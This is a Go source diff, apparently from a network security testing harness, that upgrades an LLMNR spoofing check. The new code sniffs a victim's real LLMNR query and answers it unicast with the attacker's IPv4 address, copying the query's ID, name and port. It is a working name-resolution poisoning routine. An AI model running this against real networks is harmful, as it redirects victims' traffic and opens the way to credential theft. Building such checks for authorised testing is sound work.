@@ -1,7 +1,8 @@
-// llmnr.go implements the LLMNR name-resolution spoofing attack behavior.
-// The attack answers a name with the attacker's own IPv4. The spoofed
-// answer expires with its 30 s TTL, which the catalog carries as the decay
-// bound.
+// llmnr.go implements the LLMNR name-resolution spoofing check. Impact
+// temporary, restore decay with the 30 s bound the answer's TTL announces,
+// affects clients: the answer to the victim's query names the attack
+// leg's own IPv4 for the queried name, and the victim's resolver drops the
+// entry when the TTL runs out.
 
 package fh
 
@@ -9,7 +10,9 @@ import (
 	"context"
 	"encoding/binary"
 	"encoding/json"
+	"fmt"
 	"net"
+	"time"
 
 	"github.com/gopacket/gopacket"
 	"github.com/gopacket/gopacket/layers"
@@ -28,19 +31,41 @@ type llmnrFinding struct {
 	Spoofed bool   `json:"spoofed"`
 }
 
-// RunLLMNR sends one spoofed answer to the target's victim naming the
-// attack leg's own IPv4. The queried name and the transaction ID are probe
-// content. The verdict is pending: whether the victim resolved the name to
-// the attacker needs a listener for the follow-up connection it does not
-// have. Craft and send failures are returned with operation context.
+// RunLLMNR waits for an LLMNR query from the target's victim within the
+// window and answers it unicast to the query's source MAC, IPv4, and UDP
+// port (RFC 4795 section 2.3) with the query's id and name (section
+// 2.1.1, the id copied from the query to the response) and the attack
+// leg's own IPv4. The predicate is the query itself: one answered is
+// confirmed, since the answer reaches the resolver that asked, and no
+// query within the window is pending. Whether the victim accepted the
+// answer is not observed, since the follow-up connection is the victim's
+// own stack. Craft and send failures are returned with operation context.
 func RunLLMNR(ctx context.Context, deps check.Deps) (check.Verdict, error) {
 	if err := deps.Target.Need(check.FieldVictim, check.FieldVictimMAC); err != nil {
 		return check.Verdict{}, err
 	}
 	addr := deps.AttackLeg.Addr()
-	qname := "host.lab"
+	victim := deps.Target.Victim
 
-	responsePkt, err := craftLLMNRResponse(addr, deps.Target.Victim, qname)
+	var query llmnrQuery
+	found, obs, err := check.First(ctx, deps.AttackLeg, deps.Observe, func(data []byte) bool {
+		q, ok := isLLMNRQueryFrom(data, victim.MAC)
+		if ok {
+			query = q
+		}
+		return ok
+	})
+	if err != nil {
+		if ctx.Err() != nil {
+			return check.Verdict{}, ctx.Err()
+		}
+		return check.Verdict{}, errs.Wrap(err, "llmnr: receive query")
+	}
+	if found == nil {
+		return check.Pending(fmt.Sprintf("no LLMNR query from the victim in %s", obs.Elapsed.Round(time.Millisecond))), nil
+	}
+
+	responsePkt, err := craftLLMNRResponse(addr, query)
 	if err != nil {
 		return check.Verdict{}, errs.Wrap(err, "llmnr: craft response")
 	}
@@ -50,7 +75,7 @@ func RunLLMNR(ctx context.Context, deps check.Deps) (check.Verdict, error) {
 
 	detail := llmnrFinding{
 		Action:  "llmnr-spoof",
-		Query:   qname,
+		Query:   query.name,
 		Answer:  addr.IPv4.String(),
 		TTL:     30,
 		Spoofed: true,
@@ -58,15 +83,16 @@ func RunLLMNR(ctx context.Context, deps check.Deps) (check.Verdict, error) {
 	detailBytes, _ := json.Marshal(detail)
 	deps.Emitter.Finding("llmnr", detailBytes)
 
-	return check.Pending("no observable: answer acceptance needs a listener for the victim's follow-up connection"), nil
+	return check.Confirmed(fmt.Sprintf("answered %s for %s; acceptance of the answer is not observed", query.name, victim.IP), obs.Elapsed), nil
 }
 
-// craftLLMNRResponse builds a spoofed LLMNR response: Ethernet → IPv4 →
-// UDP(5355) → DNS response with the attacker's IP.
-func craftLLMNRResponse(addr link.Addr, victim check.Host, qname string) ([]byte, error) {
+// craftLLMNRResponse builds the answer to q: Ethernet → IPv4 → UDP(5355)
+// → DNS response with the query's id and name and the attack leg's IPv4,
+// sent unicast to the query's source.
+func craftLLMNRResponse(addr link.Addr, q llmnrQuery) ([]byte, error) {
 	answerIP := addr.IPv4
 	eth := &layers.Ethernet{
-		DstMAC:       victim.MAC,
+		DstMAC:       q.srcMAC,
 		SrcMAC:       addr.MAC,
 		EthernetType: layers.EthernetTypeIPv4,
 	}
@@ -76,13 +102,13 @@ func craftLLMNRResponse(addr link.Addr, victim check.Host, qname string) ([]byte
 		TTL:      1,
 		Protocol: layers.IPProtocolUDP,
 		SrcIP:    answerIP,
-		DstIP:    victim.IP,
+		DstIP:    q.srcIP,
 	}
 	udp := &layers.UDP{
 		SrcPort: 5355,
-		DstPort: 5355,
+		DstPort: q.srcPort,
 	}
-	body := buildDNSResponse(qname, answerIP)
+	body := buildDNSResponse(q.id, q.name, answerIP)
 	_ = udp.SetNetworkLayerForChecksum(ip)
 	buf := gopacket.NewSerializeBuffer()
 	opts := gopacket.SerializeOptions{
@@ -95,9 +121,9 @@ func craftLLMNRResponse(addr link.Addr, victim check.Host, qname string) ([]byte
 	return append([]byte(nil), buf.Bytes()...), nil
 }
 
-func buildDNSResponse(qname string, answerIP net.IP) []byte {
+func buildDNSResponse(id uint16, qname string, answerIP net.IP) []byte {
 	var buf []byte
-	buf = binary.BigEndian.AppendUint16(buf, 0x1234) // ID
+	buf = binary.BigEndian.AppendUint16(buf, id)     // ID copied from the query
 	buf = binary.BigEndian.AppendUint16(buf, 0x8000) // flags=response
 	buf = binary.BigEndian.AppendUint16(buf, 1)      // QDCOUNT
 	buf = binary.BigEndian.AppendUint16(buf, 1)      // ANCOUNT
